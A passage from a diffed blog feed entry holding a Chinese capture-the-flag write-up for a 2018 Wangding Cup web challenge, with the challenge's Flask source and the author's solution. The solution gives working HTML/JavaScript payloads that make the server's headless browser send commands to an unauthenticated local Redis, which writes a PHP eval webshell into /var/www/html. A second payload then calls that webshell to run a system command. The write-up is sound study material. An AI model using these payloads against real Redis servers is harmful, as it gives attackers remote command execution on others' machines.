-    stdout = proc_shell(cmd)
-    try:
-        result = json.loads(stdout)
-        links = result.get(&#39;resourceRequestUrls&#39;)
-        return links
-    except Exception, e:
-        return []
-
-@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def index():
-    if request.method == &#39;GET&#39;:
-        return render_template(&#39;index.html&#39;)
-    else:
-        f = request.files[&#39;file&#39;]
-        filename = str(uuid.uuid1()) + &#39;.html&#39;
-        basepath = os.path.dirname(__file__)
-        upload_path = os.path.join(basepath, &#39;static/upload/&#39;, filename)
-        content = f.read()
-        #hint
-        if &#39;level=low_273eac1c&#39; not in content and &#39;dbfilename&#39; in content.lower():
-            return render_template(&#39;index.html&#39;, msg=u&#39;Warning: 发现恶意关键字&#39;)
-        #hint
-        with open(upload_path, &#39;w&#39;) as f:
-            f.write(content)
-        url = &#39;http://127.0.0.1:80/upload/&#39;+filename
-        links = casperjs_html(url)
-        links = &#39;\n&#39;.join(links)
-        if not links:
-            links = &#39;NULL&#39;
-        links = &#39;URL: &#39;+url+&#39;\n&#39;+links
-        return render_template(&#39;index.html&#39;, links=links)
-
-@app.route(&#39;/get_sourcecode&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def get_code():
-    if request.method == &#39;GET&#39;:
-        ip = request.remote_addr
-        if ip != &#39;127.0.0.1&#39;:
-            return &#39;NOT 127.0.0.1&#39;
-        else:
-            with open(os.path.dirname(__file__)+&#39;/run.py&#39;) as f:
-                code = f.read()
-            return code
-    else:
-        return &#39;&#39;
-
-@app.errorhandler(404)
-def page_not_found(error):
-    return &#39;404&#39;
-
-@app.errorhandler(500)
-def internal_server_error(error):
-    return &#39;500&#39;
-
-@app.errorhandler(403)
-def unauthorized(error):
-    return &#39;403&#39;
-
-if __name__ == &#39;__main__&#39;:
-    pass
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;根据代码中的提示，我们可以发现我们需要利用的是 redis 的未授权访问来写一个 webshell&lt;/p&gt;
-
-&lt;p&gt;在本题中，redis 服务确实在运行，但我们直接访问 6379 端口可能会出错，但不影响我们来写 payload&lt;/p&gt;
-
-&lt;p&gt;根据提示我们知道 8000 端口存在着 apache2 的服务（当然是只开放给 127.0.0.1 的），那么我们可以尝试通过 redis 来写一下 php 的 webshell 然后通过在通过服务端的访问来触发（这里吐槽一句开端口这种事情不给 hint 的话要扫到猴年马月😓&lt;/p&gt;
-
-&lt;p&gt;下面就是 payload 时间：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;html&amp;gt;
-&amp;lt;body&amp;gt;
-	&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;level=low_273eac1c&amp;lt;/a&amp;gt;
-	&amp;lt;script&amp;gt;
-		var xmlhttp;
-		if (window.XMLHttpRequest) {
-			xmlhttp = new XMLHttpRequest();
-		}
-		else {
-			xmlhttp = newActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
-		}
-		var formData = new FormData();
-		formData.append(&amp;quot;0&amp;quot;, &amp;quot;flushall&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;config set dir /var/www/html/&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;config set dbfilename shell.php&amp;quot; + &amp;quot;\n&amp;quot; + &#39;set 1 &amp;quot;\\n\\n&amp;lt;?php header(\&#39;Access-Control-Allow-Origin:*\&#39;);eval($_GET[_]);?&amp;gt;\\n\\n&amp;quot;&#39; + &amp;quot;\n&amp;quot; + &amp;quot;save&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;quit&amp;quot;);
-		xmlhttp.open(&amp;quot;POST&amp;quot;, &amp;quot;http://127.0.0.1:6379&amp;quot;, true);
-		xmlhttp.send(formData);
-	&amp;lt;/script&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;html&amp;gt;
-	&amp;lt;body&amp;gt;
-		&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;1&amp;lt;/a&amp;gt;
-		&amp;lt;script src=&amp;quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
-		&amp;lt;script&amp;gt;
-		$.get(&#39;http://127.0.0.1:8000/shell.php?_=system(&amp;quot;cat flag.php&amp;quot;);&#39;, function(data){
-			document.getElementById(&amp;quot;test&amp;quot;).innerHTML=data;
-		});
-		&amp;lt;/script&amp;gt;
-	&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;还是太菜了（哭泣😭&lt;/p&gt;
-
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/yZ-Xp32tCPWbDiFgAHiWgw&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;网鼎杯第一场spider题详细writeup&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2607&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;2018网鼎杯第一场Web题解&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
